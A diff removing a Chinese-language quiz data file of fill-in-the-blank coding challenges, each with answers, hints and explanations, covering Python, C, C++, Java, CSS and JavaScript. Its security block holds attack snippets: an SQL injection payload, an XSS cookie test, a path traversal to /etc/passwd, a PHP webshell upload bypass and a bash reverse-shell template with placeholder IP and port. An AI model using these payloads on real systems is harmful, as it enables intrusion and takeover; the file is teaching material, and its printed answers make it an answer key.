-                    template: "def greet(name, msg___'Hello'):\n    return f'{msg}, {name}!'\nprint(greet('Tom'))  # Hello, Tom!",
-                    answer: "=",
-                    hint: "用什么符号设置默认值？",
-                    explanation: "📌 默认参数用=号设置。\n\n🔹 默认参数必须在后面\n🔹 调用时可省略有默认值的参数\n🔹 避免用可变对象作默认值"
-                },
-                {
-                    id: 112,
-                    title: "可变参数",
-                    description: "*args接收多个参数",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用*args接收任意多参数",
-                    template: "def sum_all(___args):\n    return sum(args)\nprint(sum_all(1, 2, 3, 4))  # 10",
-                    answer: "*",
-                    hint: "一个星号",
-                    explanation: "📌 *args 将多个参数收集为元组。\n\n🔹 args是元组类型\n🔹 名字可以任意，如*numbers\n🔹 必须在普通参数之后"
-                },
-                {
-                    id: 113,
-                    title: "关键字参数",
-                    description: "**kwargs接收关键字参数",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用**kwargs接收关键字参数",
-                    template: "def info(___kwargs):\n    for k, v in kwargs.items():\n        print(f'{k}: {v}')\ninfo(name='Tom', age=20)",
-                    answer: "**",
-                    hint: "两个星号",
-                    explanation: "📌 **kwargs 将关键字参数收集为字典。\n\n🔹 kwargs是字典类型\n🔹 必须在*args之后\n🔹 名字可以任意"
-                },
-                {
-                    id: 114,
-                    title: "递归函数",
-                    description: "函数调用自身",
-                    difficulty: 2,
-                    xp: 30,
-                    question: "用递归计算阶乘",
-                    template: "def factorial(n):\n    if n <= 1:\n        return 1\n    return n * ___(n-1)\nprint(factorial(5))  # 120",
-                    answer: "factorial",
-                    hint: "函数调用自己",
-                    explanation: "📌 递归：函数调用自身。\n\n🔹 必须有终止条件\n🔹 每次调用问题规模减小\n🔹 注意递归深度限制"
-                },
-                {
-                    id: 115,
-                    title: "闭包",
-                    description: "返回内部函数",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "创建一个计数器闭包",
-                    template: "def counter():\n    count = 0\n    def inner():\n        nonlocal count\n        count += 1\n        ___ count\n    return inner",
-                    answer: "return",
-                    hint: "返回计数值",
-                    explanation: "📌 闭包：内部函数引用外部变量。\n\n🔹 nonlocal声明外层变量\n🔹 闭包可以记住状态\n🔹 常用于装饰器"
-                },
-                // ===== 文件操作进阶 =====
-                {
-                    id: 116,
-                    title: "读取所有行",
-                    description: "readlines读取所有行",
-                    difficulty: 1,
-                    xp: 15,
-                    question: "读取文件所有行到列表",
-                    template: "with open('file.txt', 'r') as f:\n    lines = f.___()\nprint(lines)  # 返回列表",
-                    answer: "readlines",
-                    hint: "read + lines",
-                    explanation: "📌 readlines() 返回所有行的列表。\n\n🔹 每行包含换行符\\n\n🔹 大文件占用内存多\n🔹 建议用for逐行读取"
-                },
-                {
-                    id: 117,
-                    title: "追加写入",
-                    description: "追加内容到文件末尾",
-                    difficulty: 1,
-                    xp: 15,
-                    question: "以追加模式打开文件",
-                    template: "with open('log.txt', '___') as f:\n    f.write('新日志\\n')",
-                    answer: "a",
-                    hint: "append的首字母",
-                    explanation: "📌 'a'模式追加写入，不覆盖原内容。\n\n🔹 'w'会覆盖原文件\n🔹 'a'在文件末尾追加\n🔹 'a+'可读可追加"
-                },
-                {
-                    id: 118,
-                    title: "文件是否存在",
-                    description: "检查文件是否存在",
-                    difficulty: 1,
-                    xp: 15,
-                    question: "检查文件是否存在",
-                    template: "import os\nif os.path.___(​'file.txt'):\n    print('文件存在')",
-                    answer: "exists",
-                    hint: "存在的英文",
-                    explanation: "📌 os.path.exists() 检查路径是否存在。\n\n🔹 返回True/False\n🔹 可检查文件或目录\n🔹 也可用pathlib模块"
-                },
-                {
-                    id: 119,
-                    title: "JSON读写",
-                    description: "读写JSON文件",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "将数据写入JSON文件",
-                    template: "import json\ndata = {'name': 'Tom'}\nwith open('data.json', 'w') as f:\n    json.___(data, f)",
-                    answer: "dump",
-                    hint: "写入用dump",
-                    explanation: "📌 json.dump(obj, file) 写入JSON文件。\n\n🔹 dump写文件，dumps转字符串\n🔹 load读文件，loads解析字符串\n🔹 ensure_ascii=False支持中文"
-                },
-                {
-                    id: 120,
-                    title: "CSV读取",
-                    description: "读取CSV文件",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用csv模块读取文件",
-                    template: "import csv\nwith open('data.csv', 'r') as f:\n    reader = csv.___(f)\n    for row in reader:\n        print(row)",
-                    answer: "reader",
-                    hint: "创建CSV读取器",
-                    explanation: "📌 csv.reader(file) 创建CSV读取器。\n\n🔹 返回迭代器，逐行读取\n🔹 每行是一个列表\n🔹 DictReader可得字典"
-                },
-                // ===== 异常处理进阶 =====
-                {
-                    id: 121,
-                    title: "捕获多种异常",
-                    description: "一次捕获多种异常",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "同时捕获多种异常",
-                    template: "try:\n    x = int('abc')\nexcept (ValueError, ___) as e:\n    print('错误:', e)",
-                    answer: "TypeError",
-                    hint: "类型错误",
-                    explanation: "📌 用元组捕获多种异常。\n\n🔹 except (E1, E2) 捕获多种\n🔹 as e 获取异常对象\n🔹 Exception捕获所有"
-                },
-                {
-                    id: 122,
-                    title: "finally块",
-                    description: "无论如何都执行",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "添加finally块",
-                    template: "try:\n    f = open('test.txt')\nexcept FileNotFoundError:\n    print('文件不存在')\n___:\n    print('清理完成')",
-                    answer: "finally",
-                    hint: "最终的英文",
-                    explanation: "📌 finally 块无论是否异常都会执行。\n\n🔹 常用于资源清理\n🔹 即使有return也会执行\n🔹 with语句更推荐"
-                },
-                {
-                    id: 123,
-                    title: "抛出异常",
-                    description: "主动抛出异常",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "主动抛出ValueError",
-                    template: "def check_age(age):\n    if age < 0:\n        ___ ValueError('年龄不能为负')\n    return age",
-                    answer: "raise",
-                    hint: "举起/抛出",
-                    explanation: "📌 raise 主动抛出异常。\n\n🔹 raise Exception('信息')\n🔹 raise不带参数重新抛出\n🔹 可抛出自定义异常"
-                },
-                {
-                    id: 124,
-                    title: "自定义异常",
-                    description: "创建自定义异常类",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "定义自定义异常类",
-                    template: "class MyError(___​):\n    pass\n\nraise MyError('自定义错误')",
-                    answer: "Exception",
-                    hint: "继承哪个基类？",
-                    explanation: "📌 自定义异常继承Exception类。\n\n🔹 可添加__init__自定义属性\n🔹 可添加__str__自定义输出\n🔹 便于区分不同错误类型"
-                },
-                {
-                    id: 125,
-                    title: "断言",
-                    description: "assert断言检查",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "使用断言检查条件",
-                    template: "def divide(a, b):\n    ___ b != 0, '除数不能为0'\n    return a / b",
-                    answer: "assert",
-                    hint: "断言关键字",
-                    explanation: "📌 assert 条件为False时抛出AssertionError。\n\n🔹 用于调试和测试\n🔹 生产环境可用-O禁用\n🔹 不应处理业务逻辑"
-                },
-                // ===== 面向对象进阶 =====
-                {
-                    id: 126,
-                    title: "类属性",
-                    description: "定义类属性",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "定义所有实例共享的属性",
-                    template: "class Dog:\n    species = '犬类'  # ___属性\n    def __init__(self, name):\n        self.name = name  # 实例属性",
-                    answer: "类",
-                    hint: "所有实例共享的属性叫什么属性？",
-                    explanation: "📌 类属性在类内、方法外定义，所有实例共享。\n\n🔹 类名.属性 访问类属性\n🔹 self.属性 访问实例属性\n🔹 修改类属性影响所有实例"
-                },
-                {
-                    id: 127,
-                    title: "类方法",
-                    description: "@classmethod装饰器",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "定义类方法",
-                    template: "class MyClass:\n    count = 0\n    @___\n    def get_count(cls):\n        return cls.count",
-                    answer: "classmethod",
-                    hint: "类方法的装饰器",
-                    explanation: "📌 @classmethod 定义类方法，第一个参数是cls。\n\n🔹 可通过类或实例调用\n🔹 常用于工厂方法\n🔹 能访问类属性"
-                },
-                {
-                    id: 128,
-                    title: "静态方法",
-                    description: "@staticmethod装饰器",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "定义静态方法",
-                    template: "class Math:\n    @___\n    def add(a, b):\n        return a + b",
-                    answer: "staticmethod",
-                    hint: "静态方法的装饰器",
-                    explanation: "📌 @staticmethod 定义静态方法，不需要self或cls。\n\n🔹 像普通函数，但属于类\n🔹 不能访问实例/类属性\n🔹 组织相关功能"
-                },
-                {
-                    id: 129,
-                    title: "属性装饰器",
-                    description: "@property将方法变属性",
-                    difficulty: 2,
-                    xp: 30,
-                    question: "用@property创建只读属性",
-                    template: "class Circle:\n    def __init__(self, r):\n        self.r = r\n    @___\n    def area(self):\n        return 3.14 * self.r ** 2",
-                    answer: "property",
-                    hint: "属性装饰器",
-                    explanation: "📌 @property 将方法变成属性访问。\n\n🔹 调用时不需要括号\n🔹 可配合setter设置值\n🔹 实现属性的计算和验证"
-                },
-                {
-                    id: 130,
-                    title: "魔术方法__str__",
-                    description: "自定义对象字符串表示",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "自定义print输出",
-                    template: "class Person:\n    def __init__(self, name):\n        self.name = name\n    def ___(self):\n        return f'Person: {self.name}'",
-                    answer: "__str__",
-                    hint: "字符串表示的魔术方法",
-                    explanation: "📌 __str__ 定义print()和str()的输出。\n\n🔹 返回用户友好的字符串\n🔹 __repr__ 返回开发者信息\n🔹 没有__str__时用__repr__"
-                },
-                // ===== 高级技巧 =====
-                {
-                    id: 131,
-                    title: "装饰器基础",
-                    description: "创建简单装饰器",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "创建一个打印日志的装饰器",
-                    template: "def log(func):\n    def wrapper(*args):\n        print(f'调用{func.__name__}')\n        return ___(​*args)\n    return wrapper",
-                    answer: "func",
-                    hint: "调用被装饰的函数",
-                    explanation: "📌 装饰器：接收函数，返回新函数。\n\n🔹 在不修改原函数情况下增加功能\n🔹 @语法是语法糖\n🔹 常用于日志、计时、权限"
-                },
-                {
-                    id: 132,
-                    title: "生成器函数",
-                    description: "用yield创建生成器",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "创建一个生成器函数",
-                    template: "def count_up(n):\n    i = 0\n    while i < n:\n        ___ i\n        i += 1",
-                    answer: "yield",
-                    hint: "生成器用什么关键字？",
-                    explanation: "📌 yield 使函数变成生成器。\n\n🔹 每次yield暂停并返回值\n🔹 next()继续执行\n🔹 内存效率高"
-                },
-                {
-                    id: 133,
-                    title: "生成器表达式",
-                    description: "用圆括号创建生成器",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "创建生成器表达式",
-                    template: "# 列表推导用[]\n# 生成器表达式用()\ngen = ___ x**2 for x in range(5))\nprint(list(gen))",
-                    answer: "(",
-                    hint: "用什么括号？",
-                    explanation: "📌 生成器表达式用圆括号()。\n\n🔹 (expr for x in iterable)\n🔹 惰性计算，节省内存\n🔹 只能遍历一次"
-                },
-                {
-                    id: 134,
-                    title: "上下文管理器",
-                    description: "自定义with语句",
-                    difficulty: 3,
-                    xp: 35,
-                    question: "实现__enter__方法",
-                    template: "class MyContext:\n    def ___(self):\n        print('进入')\n        return self\n    def __exit__(self, *args):\n        print('退出')",
-                    answer: "__enter__",
-                    hint: "进入时调用的方法",
-                    explanation: "📌 上下文管理器需实现__enter__和__exit__。\n\n🔹 with语句自动调用\n🔹 __enter__返回值赋给as变量\n🔹 __exit__处理清理和异常"
-                },
-                {
-                    id: 135,
-                    title: "枚举类型",
-                    description: "创建枚举",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "创建枚举类",
-                    template: "from enum import ___\nclass Color(___):\n    RED = 1\n    GREEN = 2\n    BLUE = 3",
-                    answer: "Enum",
-                    hint: "枚举基类",
-                    explanation: "📌 Enum 创建枚举类型。\n\n🔹 成员是唯一的常量\n🔹 可通过名称或值访问\n🔹 适合表示固定选项"
-                },
-                {
-                    id: 136,
-                    title: "类型注解",
-                    description: "函数参数类型注解",
-                    difficulty: 2,
-                    xp: 20,
-                    question: "添加参数类型注解",
-                    template: "def greet(name___ str) -> str:\n    return f'Hello, {name}'",
-                    answer: ":",
-                    hint: "注解用什么符号？",
-                    explanation: "📌 类型注解用冒号:声明类型。\n\n🔹 参数: 类型\n🔹 -> 返回值类型\n🔹 不强制检查，用于文档和IDE"
-                },
-                {
-                    id: 137,
-                    title: "dataclass",
-                    description: "数据类装饰器",
-                    difficulty: 2,
-                    xp: 30,
-                    question: "使用dataclass简化类定义",
-                    template: "from dataclasses import ___\n@___\nclass Point:\n    x: int\n    y: int",
-                    answer: "dataclass",
-                    hint: "数据类装饰器名称",
-                    explanation: "📌 @dataclass 自动生成__init__等方法。\n\n🔹 自动生成构造函数\n🔹 自动生成__repr__\n🔹 可选生成比较方法"
-                },
-                {
-                    id: 138,
-                    title: "海象运算符",
-                    description: "赋值表达式:=",
-                    difficulty: 2,
-                    xp: 25,
-                    question: "用海象运算符简化代码",
-                    template: "# Python 3.8+\nif (n ___ len(data)) > 10:\n    print(f'长度{n}超过10')",
-                    answer: ":=",
-                    hint: "像海象的眼睛和牙齿",
-                    explanation: "📌 := 海象运算符，在表达式中赋值。\n\n🔹 Python 3.8+支持\n🔹 减少重复计算\n🔹 适合while和if条件"
-                },
-                {
-                    id: 139,
-                    title: "match语句",
-                    description: "模式匹配",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "使用match进行模式匹配",
-                    template: "# Python 3.10+\ndef check(x):\n    ___ x:\n        case 0:\n            return '零'\n        case _:\n            return '其他'",
-                    answer: "match",
-                    hint: "匹配关键字",
-                    explanation: "📌 match-case 是Python 3.10+的模式匹配。\n\n🔹 类似其他语言的switch\n🔹 支持复杂模式匹配\n🔹 _是通配符"
-                },
-                {
-                    id: 140,
-                    title: "位置参数only",
-                    description: "仅限位置参数",
-                    difficulty: 3,
-                    xp: 30,
-                    question: "定义仅限位置参数",
-                    template: "# /之前的参数只能按位置传\ndef func(a, b, ___, c):\n    return a + b + c",
-                    answer: "/",
-                    hint: "斜杠",
-                    explanation: "📌 / 之前的参数只能按位置传递。\n\n🔹 Python 3.8+支持\n🔹 防止参数名被依赖\n🔹 与*（仅限关键字）相对"
-                },
-                // ========== 网络安全挑战题 ==========
-                {
-                    id: 201,
-                    title: "HTTP基础",
-                    description: "了解HTTP请求方法",
-                    difficulty: 1,
-                    xp: 10,
-                    courseType: "security",
-                    question: "获取网页数据最常用的HTTP方法是？",
-                    template: "# 访问网站时浏览器发送的请求\nmethod = '___'",
-                    answer: "GET",
-                    hint: "获取数据用什么方法？",
-                    explanation: "📌 GET是最常用的HTTP请求方法。\n\n🔹 GET - 获取资源\n🔹 POST - 提交数据\n🔹 PUT - 更新资源\n🔹 DELETE - 删除资源"
-                },
-                {
-                    id: 202,
-                    title: "状态码识别",
-                    description: "识别HTTP状态码",
-                    difficulty: 1,
-                    xp: 10,
-                    courseType: "security",
-                    question: "表示请求成功的HTTP状态码是？",
-                    template: "# 服务器返回成功的状态码\nstatus_code = ___",
-                    answer: "200",
-                    hint: "最常见的成功状态码",
-                    explanation: "📌 HTTP状态码分类：\n\n🔹 2xx - 成功 (200 OK)\n🔹 3xx - 重定向 (301/302)\n🔹 4xx - 客户端错误 (404 Not Found)\n🔹 5xx - 服务器错误 (500)"
-                },
-                {
-                    id: 203,
-                    title: "SQL注入入门",
-                    description: "理解SQL注入原理",
-                    difficulty: 2,
-                    xp: 20,
-                    courseType: "security",
-                    question: "SQL注入中用于注释后续内容的符号是？",
-                    template: "# SQL注入：admin' OR '1'='1' ___\n# 注释掉后面的SQL语句",
-                    answer: "--",
-                    hint: "SQL中的单行注释符号",
-                    explanation: "📌 SQL注入常用技巧：\n\n🔹 -- 单行注释\n🔹 /* */ 多行注释\n🔹 # MySQL注释\n🔹 永真条件：OR '1'='1'"
-                },
-                {
-                    id: 204,
-                    title: "XSS攻击",
-                    description: "跨站脚本攻击",
-                    difficulty: 2,
-                    xp: 20,
-                    courseType: "security",
-                    question: "XSS攻击中常用来弹窗测试的JavaScript函数是？",
-                    template: "// 测试XSS漏洞\n___('XSS漏洞存在！')",
-                    answer: "alert",
-                    hint: "JavaScript弹窗函数",
-                    explanation: "📌 XSS测试常用payload：\n\n🔹 alert() 弹窗测试\n🔹 document.cookie 获取Cookie\n🔹 location.href 重定向\n\n⚠️ 仅在授权环境测试！"
-                },
-                {
-                    id: 205,
-                    title: "目录遍历",
-                    description: "路径穿越攻击",
-                    difficulty: 2,
-                    xp: 25,
-                    courseType: "security",
-                    question: "目录遍历攻击中，返回上级目录的符号是？",
-                    template: "# 尝试读取/etc/passwd\npath = '___/___/___/etc/passwd'",
-                    answer: "..",
-                    hint: "在路径中表示父目录",
-                    explanation: "📌 目录遍历攻击：\n\n🔹 ../返回上级目录\n🔹 常见目标：/etc/passwd\n🔹 防御：过滤../，使用白名单"
-                },
-                {
-                    id: 206,
-                    title: "WebShell命令",
-                    description: "系统命令执行",
-                    difficulty: 2,
-                    xp: 20,
-                    courseType: "security",
-                    question: "Linux中查看当前用户的命令是？",
-                    template: "# 查看当前登录用户\n$ ___",
-                    answer: "whoami",
-                    hint: "who am i的简写",
-                    explanation: "📌 常用Linux命令：\n\n🔹 whoami - 当前用户\n🔹 pwd - 当前目录\n🔹 ls - 列出文件\n🔹 cat - 查看文件\n🔹 uname -a - 系统信息"
-                },
-                {
-                    id: 207,
-                    title: "端口扫描",
-                    description: "常见服务端口",
-                    difficulty: 2,
-                    xp: 20,
-                    courseType: "security",
-                    question: "HTTP服务默认使用的端口号是？",
-                    template: "# Web服务器默认端口\nhttp_port = ___",
-                    answer: "80",
-                    hint: "最常见的Web端口",
-                    explanation: "📌 常见端口：\n\n🔹 80 - HTTP\n🔹 443 - HTTPS\n🔹 22 - SSH\n🔹 3306 - MySQL\n🔹 3389 - RDP远程桌面"
-                },
-                {
-                    id: 208,
-                    title: "文件上传绕过",
-                    description: "绕过文件类型检测",
-                    difficulty: 3,
-                    xp: 30,
-                    courseType: "security",
-                    question: "PHP文件的常见扩展名（可绕过.php过滤）是？",
-                    template: "# 上传恶意文件绕过检测\nfilename = 'shell.___'",
-                    answer: "phtml",
-                    hint: "PHP的另一个扩展名",
-                    explanation: "📌 PHP可执行扩展名：\n\n🔹 .php .phtml .php3\n🔹 .php4 .php5 .pht\n🔹 防御：白名单验证"
-                },
-                {
-                    id: 209,
-                    title: "密码学基础",
-                    description: "常见哈希算法",
-                    difficulty: 2,
-                    xp: 20,
-                    courseType: "security",
-                    question: "生成32位十六进制字符串的哈希算法是？",
-                    template: "# 128位哈希，32个十六进制字符\nhash_type = '___'",
-                    answer: "MD5",
-                    hint: "Message Digest 5",
-                    explanation: "📌 常见哈希算法：\n\n🔹 MD5 - 128位，已不安全\n🔹 SHA1 - 160位\n🔹 SHA256 - 256位，推荐\n🔹 bcrypt - 密码专用"
-                },
-                {
-                    id: 210,
-                    title: "反弹Shell",
-                    description: "反向连接技术",
-                    difficulty: 3,
-                    xp: 35,
-                    courseType: "security",
-                    question: "Bash反弹Shell中用于重定向的设备文件是？",
-                    template: "# bash -i >& /dev/___/IP/PORT 0>&1",
-                    answer: "tcp",
-                    hint: "网络协议名称",
-                    explanation: "📌 反弹Shell原理：\n\n🔹 目标机器主动连接攻击者\n🔹 绕过入站防火墙\n🔹 /dev/tcp是bash特性\n\n⚠️ 仅用于授权测试！"
-                },
-                // ========== C语言挑战 ==========
-                { id: 301, title: "Hello C", description: "C语言输出", difficulty: 1, xp: 10, courseType: "c", question: "C语言输出用什么函数？", template: "#include <stdio.h>\nint main() {\n    ___(\"Hello C!\");\n    return 0;\n}", answer: "printf", hint: "print + format", explanation: "📌 printf是C语言最常用的输出函数" },
-                { id: 302, title: "变量声明", description: "整数变量", difficulty: 1, xp: 10, courseType: "c", question: "声明一个整数变量用什么类型？", template: "___ age = 18;", answer: "int", hint: "integer的缩写", explanation: "📌 int是C语言最常用的整数类型" },
-                { id: 303, title: "格式化输出", description: "输出整数", difficulty: 1, xp: 15, courseType: "c", question: "printf输出整数用什么格式符？", template: "int n = 10;\nprintf(\"数字是: ___\", n);", answer: "%d", hint: "decimal", explanation: "📌 %d用于输出十进制整数" },
-                { id: 304, title: "取地址", description: "指针基础", difficulty: 2, xp: 20, courseType: "c", question: "获取变量地址用什么运算符？", template: "int num = 10;\nint *ptr = ___num;", answer: "&", hint: "and符号", explanation: "📌 &是取地址运算符" },
-                { id: 305, title: "解引用", description: "访问指针值", difficulty: 2, xp: 20, courseType: "c", question: "通过指针获取值用什么运算符？", template: "int *ptr = &num;\nint value = ___ptr;", answer: "*", hint: "星号", explanation: "📌 *是解引用运算符" },
-                { id: 306, title: "动态内存", description: "内存分配", difficulty: 2, xp: 25, courseType: "c", question: "动态分配内存用什么函数？", template: "int *arr = (int*)___(10 * sizeof(int));", answer: "malloc", hint: "memory allocation", explanation: "📌 malloc用于动态分配内存" },
-                { id: 307, title: "释放内存", description: "防止内存泄漏", difficulty: 2, xp: 20, courseType: "c", question: "释放动态内存用什么函数？", template: "___(ptr);\nptr = NULL;", answer: "free", hint: "释放的英文", explanation: "📌 free释放malloc分配的内存" },
-                { id: 308, title: "字符串长度", description: "strlen函数", difficulty: 1, xp: 15, courseType: "c", question: "获取字符串长度的函数？", template: "#include <string.h>\nint len = ___(\"Hello\");", answer: "strlen", hint: "string length", explanation: "📌 strlen返回字符串长度（不含\\0）" },
-                // ========== C++挑战 ==========
-                { id: 401, title: "Hello C++", description: "C++输出", difficulty: 1, xp: 10, courseType: "cpp", question: "C++输出用什么对象？", template: "#include <iostream>\nusing namespace std;\nint main() {\n    ___ << \"Hello C++!\";\n    return 0;\n}", answer: "cout", hint: "console out", explanation: "📌 cout是C++标准输出流对象" },
-                { id: 402, title: "换行符", description: "C++换行", difficulty: 1, xp: 10, courseType: "cpp", question: "C++中换行用什么？", template: "cout << \"Hello\" << ___;", answer: "endl", hint: "end line", explanation: "📌 endl输出换行并刷新缓冲区" },
-                { id: 403, title: "输入", description: "C++输入", difficulty: 1, xp: 15, courseType: "cpp", question: "C++输入用什么对象？", template: "int age;\n___ >> age;", answer: "cin", hint: "console in", explanation: "📌 cin是C++标准输入流对象" },
-                { id: 404, title: "引用", description: "变量别名", difficulty: 2, xp: 20, courseType: "cpp", question: "声明引用用什么符号？", template: "int num = 10;\nint ___ref = num;", answer: "&", hint: "和取地址一样的符号", explanation: "📌 &在类型后面表示引用" },
-                { id: 405, title: "类定义", description: "面向对象", difficulty: 2, xp: 20, courseType: "cpp", question: "定义类用什么关键字？", template: "___ Student {\npublic:\n    string name;\n};", answer: "class", hint: "类的英文", explanation: "📌 class用于定义类" },
-                { id: 406, title: "私有成员", description: "访问控制", difficulty: 2, xp: 20, courseType: "cpp", question: "私有成员用什么关键字？", template: "class Person {\n___:\n    int age;\n};", answer: "private", hint: "私有的英文", explanation: "📌 private成员只能在类内访问" },
-                { id: 407, title: "继承", description: "类继承", difficulty: 2, xp: 25, courseType: "cpp", question: "类继承用什么符号？", template: "class Dog ___ public Animal {\n};", answer: ":", hint: "冒号", explanation: "📌 :用于表示继承关系" },
-                { id: 408, title: "动态数组", description: "STL容器", difficulty: 2, xp: 20, courseType: "cpp", question: "C++ STL中动态数组叫什么？", template: "#include <___>\nusing namespace std;", answer: "vector", hint: "向量的英文", explanation: "📌 vector是最常用的STL容器" },
-                // ========== Java挑战 ==========
-                { id: 501, title: "Hello Java", description: "Java输出", difficulty: 1, xp: 10, courseType: "java", question: "Java输出语句？", template: "___.out.println(\"Hello Java!\");", answer: "System", hint: "系统类", explanation: "📌 System.out.println是Java标准输出" },
-                { id: 502, title: "主方法", description: "程序入口", difficulty: 1, xp: 15, courseType: "java", question: "Java主方法的返回类型？", template: "public static ___ main(String[] args) {}", answer: "void", hint: "无返回值", explanation: "📌 main方法返回void" },
-                { id: 503, title: "字符串类型", description: "文本数据", difficulty: 1, xp: 10, courseType: "java", question: "Java字符串类型？", template: "___ name = \"张三\";", answer: "String", hint: "首字母大写", explanation: "📌 String是Java的字符串类" },
-                { id: 504, title: "创建对象", description: "实例化", difficulty: 1, xp: 15, courseType: "java", question: "创建对象用什么关键字？", template: "Student s = ___ Student();", answer: "new", hint: "新的", explanation: "📌 new用于创建对象实例" },
-                { id: 505, title: "继承", description: "类继承", difficulty: 2, xp: 20, courseType: "java", question: "Java继承用什么关键字？", template: "class Dog ___ Animal {}", answer: "extends", hint: "扩展", explanation: "📌 extends表示继承" },
-                { id: 506, title: "实现接口", description: "接口实现", difficulty: 2, xp: 20, courseType: "java", question: "实现接口用什么关键字？", template: "class Bird ___ Flyable {}", answer: "implements", hint: "实现的英文", explanation: "📌 implements实现接口" },
-                { id: 507, title: "动态数组", description: "集合框架", difficulty: 2, xp: 20, courseType: "java", question: "Java动态数组类？", template: "___<String> list = new ArrayList<>();", answer: "ArrayList", hint: "数组列表", explanation: "📌 ArrayList是最常用的集合类" },
-                { id: 508, title: "异常处理", description: "捕获异常", difficulty: 2, xp: 25, courseType: "java", question: "捕获异常用什么关键字？", template: "try {\n    // 代码\n} ___ (Exception e) {}", answer: "catch", hint: "捕获的英文", explanation: "📌 catch用于捕获异常" },
-                // ========== CSS挑战 ==========
-                { id: 601, title: "背景颜色", description: "设置背景", difficulty: 1, xp: 10, courseType: "css", question: "设置背景颜色的属性？", template: "body {\n    ___: #f0f0f0;\n}", answer: "background-color", hint: "背景-颜色", explanation: "📌 background-color设置背景颜色" },
-                { id: 602, title: "文字颜色", description: "设置颜色", difficulty: 1, xp: 10, courseType: "css", question: "设置文字颜色的属性？", template: "p {\n    ___: red;\n}", answer: "color", hint: "颜色的英文", explanation: "📌 color设置文字颜色" },
-                { id: 603, title: "字体大小", description: "调整字号", difficulty: 1, xp: 10, courseType: "css", question: "设置字体大小的属性？", template: "h1 {\n    ___: 24px;\n}", answer: "font-size", hint: "字体-大小", explanation: "📌 font-size设置字体大小" },
-                { id: 604, title: "外边距", description: "元素间距", difficulty: 1, xp: 15, courseType: "css", question: "设置外边距的属性？", template: ".box {\n    ___: 10px;\n}", answer: "margin", hint: "外边距的英文", explanation: "📌 margin设置元素外边距" },
-                { id: 605, title: "内边距", description: "内部间距", difficulty: 1, xp: 15, courseType: "css", question: "设置内边距的属性？", template: ".box {\n    ___: 20px;\n}", answer: "padding", hint: "内边距的英文", explanation: "📌 padding设置元素内边距" },
-                { id: 606, title: "弹性布局", description: "Flexbox", difficulty: 2, xp: 20, courseType: "css", question: "启用弹性布局的display值？", template: ".container {\n    display: ___;\n}", answer: "flex", hint: "弹性的英文", explanation: "📌 display: flex启用Flexbox布局" },
-                { id: 607, title: "主轴对齐", description: "Flex对齐", difficulty: 2, xp: 20, courseType: "css", question: "主轴对齐用什么属性？", template: ".container {\n    display: flex;\n    ___: center;\n}", answer: "justify-content", hint: "证明-内容", explanation: "📌 justify-content控制主轴对齐" },
-                { id: 608, title: "网格布局", description: "Grid布局", difficulty: 2, xp: 25, courseType: "css", question: "启用网格布局的display值？", template: ".container {\n    display: ___;\n}", answer: "grid", hint: "网格的英文", explanation: "📌 display: grid启用Grid布局" },
-                // ========== JavaScript挑战 ==========
-                { id: 701, title: "变量声明", description: "let关键字", difficulty: 1, xp: 10, courseType: "javascript", question: "ES6声明变量用什么关键字？", template: "___ name = '张三';", answer: "let", hint: "让的英文", explanation: "📌 let是ES6新增的变量声明" },
-                { id: 702, title: "常量声明", description: "const关键字", difficulty: 1, xp: 10, courseType: "javascript", question: "声明常量用什么关键字？", template: "___ PI = 3.14;", answer: "const", hint: "constant的缩写", explanation: "📌 const声明的变量不可重新赋值" },
-                { id: 703, title: "控制台输出", description: "调试输出", difficulty: 1, xp: 10, courseType: "javascript", question: "JS控制台输出方法？", template: "___.log('Hello JS!');", answer: "console", hint: "控制台的英文", explanation: "📌 console.log是最常用的调试方法" },
-                { id: 704, title: "箭头函数", description: "ES6函数", difficulty: 2, xp: 20, courseType: "javascript", question: "箭头函数用什么符号？", template: "const add = (a, b) ___ a + b;", answer: "=>", hint: "等号大于号", explanation: "📌 =>是箭头函数的标志" },
-                { id: 705, title: "获取元素", description: "DOM操作", difficulty: 1, xp: 15, courseType: "javascript", question: "通过ID获取元素的方法？", template: "let el = document.___(\"myId\");", answer: "getElementById", hint: "get Element By Id", explanation: "📌 getElementById通过ID获取元素" },
-                { id: 706, title: "添加事件", description: "事件监听", difficulty: 2, xp: 20, courseType: "javascript", question: "添加事件监听的方法？", template: "btn.___(\"click\", handler);", answer: "addEventListener", hint: "添加事件监听器", explanation: "📌 addEventListener添加事件监听" },
-                { id: 707, title: "模板字符串", description: "字符串插值", difficulty: 1, xp: 15, courseType: "javascript", question: "模板字符串用什么符号包裹？", template: "const msg = ___Hello ${name}___;", answer: "`", hint: "反引号", explanation: "📌 反引号`用于模板字符串" },
-                { id: 708, title: "异步等待", description: "async/await", difficulty: 3, xp: 30, courseType: "javascript", question: "等待Promise结果用什么关键字？", template: "async function getData() {\n    const result = ___ fetch(url);\n}", answer: "await", hint: "等待的英文", explanation: "📌 await等待Promise完成" },
-                // ========== AI人工智能挑战 ==========
-                { id: 801, title: "AI类型", description: "了解AI分类", difficulty: 1, xp: 10, courseType: "ai", question: "从数据中学习规律的AI技术叫什么？", template: "# ___学习是AI的核心技术", answer: "机器", hint: "Machine的中文", explanation: "📌 机器学习(Machine Learning)让计算机从数据中学习" },
-                { id: 802, title: "深度学习", description: "神经网络", difficulty: 1, xp: 10, courseType: "ai", question: "使用多层神经网络的学习方法叫？", template: "# ___学习使用多层神经网络", answer: "深度", hint: "Deep的中文", explanation: "📌 深度学习(Deep Learning)是机器学习的子集" },
